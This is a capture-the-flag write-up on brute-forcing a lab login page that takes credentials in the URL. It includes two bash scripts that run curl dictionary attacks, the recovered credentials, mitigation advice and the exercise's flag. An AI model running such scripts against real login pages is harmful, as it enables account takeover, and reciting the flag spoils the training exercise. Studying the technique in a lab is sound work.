# <span style="text-decoration: underline"> Brutforce </span>

##### Tags : `brutforce` , `curl`, `guess`
##### Server ip : `192.168.1.17 `
____

# <span style="text-decoration: underline">problem</span>

Once common way of breaking into website is uisng brutforce. When we go to **signin** page and enter
|username|password|
|--|--|
|AAA|BBB|

and try to signin using those credentials, we are redirected to the folloing `URL` : **`http://192.168.1.17/?page=signin&username=AAA&password=BBB&Login=Login#`**

In the `URL` we can see the following parameters

|key|value|
|--|--|
|page|signin|
|username|AAA|
|password|BBB|
|Login|Login|

We can clearly see in the `URL` what we used as our `username` and `password`. This is clearly an old way of doing things because it expose the user credentials in plain text and on the `URL`



# <span style="text-decoration: underline">Solution</span>

To try a brutforce agains this `URL` all we need to do is change the value of `username` and `password`. It would take an infinit amount of timet ot try all the characters as **username** and **password** so a better way to do this would be using [`dictionary`](https://nordpass.com/blog/what-is-a-dictionary-attack/) based attack.

> A dictionary attack is a systematic method of guessing a password by trying many common words and their simple variations. Attackers use extensive lists of the most commonly used passwords, popular pet names, fictional characters, or literally just words from a dictionary – hence the name of the attack. They also change some letters to numbers or special characters, like “p@ssw0rd”.

It would still take way too long to guess both **username** and **password** so let's narrow down a bit our `username` wordlist. According to [this](https://lifehacker.com/the-top-10-usernames-and-passwords-hackers-try-to-get-i-1762638243) website the followings are the most commong `usernames`.

|username|count|percent|
|--|--|--|
| administrator| 77125 | 4.87%|
| Administrator| 53427| 24.15%|
| user1| 8575 | 3.88%|
| admin| 4935| 2.23%|
| alex| 4051| 1.83%|
| pos| 2321| 1.05%|
| demo| 1920| 0.87%|
| db2admin| 1654| 0.75%|
| Admin| 1378| 0.62%|
| sql| 1354| 0.61%|

We could also narrow down the **password** list like our **username** list (all though in realworld we should probably try a bigger list). Here is a list of website that propose a short list of commonly used password.

- https://en.wikipedia.org/wiki/Wikipedia:10,000_most_common_passwords
- https://github.com/DavidWittman/wpxmlrpcbrute/blob/master/wordlists/1000-most-common-passwords.txt
- https://cybernews.com/best-password-managers/most-common-passwords/
- https://nordpass.com/most-common-passwords-list/
- https://github.com/iryndin/10K-Most-Popular-Passwords/blob/master/passwords.txt
- https://techcult.com/most-common-passwords/

I have noticed that [this](git) repository contains a short list (1k) passwords that we can find in the [wikipedia](https://en.wikipedia.org/wiki/Wikipedia:10,000_most_common_passwords) page and this could be a good start.

All we have to do now is 

- Download the list of password
- Write some code to do the query using all the passwords
- And wait for the program to find the password

Here is a simple `shell` script to do the brutforce

?> We will use `admin` as username first because it is one of the most used username for admin account.


```bash
#!/bin/bash

username="admin" # The username we
host="192.168.1.17" # The ip address of the machine
dictionary="passwords.txt" # Path to the dictionary (password list)
i=1 # A simple iterator to know howmany password have we tried

while IFS= read -r password;
do
	echo -n "trying [$i]: $password"
	curl -s "http://$host/?page=signin&username=$username&password=$password&Login=Login#" | grep flag > /dev/null # You can also get the password directly in the terminal by removing the "> /dev/null"
	if [ $? -eq 0 ]
	then
		printf "\n\n"
		echo "Found the password : $password"
		exit
	fi
	((i=i+1))
	printf "\33[2K\r"
done < $dictionary
```

If you do not desire to download anything then you can use the following script

```bash
HOST='192.168.1.17'
USERNAME='admin'
DICTIONARY=($(curl -s "https://raw.githubusercontent.com/DavidWittman/wpxmlrpcbrute/master/wordlists/1000-most-common-passwords.txt"))

for i in ${!DICTIONARY[@]};
do
	echo -n  "trying [$i]: ${DICTIONARY[$i]}"
	curl -s "http://$HOST/?page=signin&username=$USERNAME&password=${DICTIONARY[$i]}&Login=Login#" | grep flag > /dev/null # You can also get the password directly in the terminal by removing the "> /dev/null"
	if [ $? -eq 0 ]
	then
		printf "\n\n"
		echo "Found the password : ${DICTIONARY[$i]}"
		exit
	fi
	printf "\33[2K\r"
done
```

!> If you try the script, do not forget to put the **right** `host` / `ip` address for `you`!

After executing our script, the script tells us that the password is `shadow`. so :

|username|password|
|--|--|
|admin|shadow|

# How to avoid the problem
This was once a common problem before where website exposed the user credentials directoly on the `URL` which itself is not encrypted. In moderndays we start

- Not sending credentials or importent information over [`GET`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/GET) method and start using [`POST`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/POST).
- We use [`ssl`](https://developer.mozilla.org/en-US/docs/Glossary/SSL) encryption and [`https`](https://developer.mozilla.org/en-US/docs/Glossary/https) to send our data over internet so even if someone get hold of our data they will have hard time decrypting it.
- Set up a maximum request length so that if a someone tries to send to many requests, they get blocked.
- 2 factor authentication so that even if you have the correct credential you will still need a mobile device or a third element to log in.
- A server could also guess if the user begind the screen is the right user depending on the user IP, location, behaviour and many other things to protect better the user account.


# Flag

```text
b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
```